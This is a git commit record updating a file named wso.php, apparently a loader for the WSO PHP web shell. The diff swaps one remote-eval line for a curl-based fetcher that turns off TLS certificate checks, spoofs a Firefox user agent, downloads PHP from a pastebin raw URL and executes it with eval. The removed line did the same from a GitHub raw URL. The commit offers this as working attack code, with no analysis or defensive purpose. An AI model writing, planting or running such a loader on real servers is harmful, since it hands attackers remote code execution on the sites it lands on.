0f8d675f5e87776040240b8e5b5c92104468913c
Aht-crew <39540991+Aht-crew@users.noreply.github.com>
2020-03-03 22:31:38 +0100

    Update wso.php

--- wso.php
+++ wso.php
@@ -1,1 +1,15 @@
-<?php eval("?>".file_get_contents("https://raw.githubusercontent.com/Aht-crew/upload/master/a.php"));?>
+<?php
+function get_contents($url){
+  $ch = curl_init("$url");
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+  curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
+  curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
+  $result = curl_exec($ch);
+  return $result;
+}
+$a = get_contents('https://pastebin.com/raw/Ec4ayV5c');
+eval('?>'.$a);
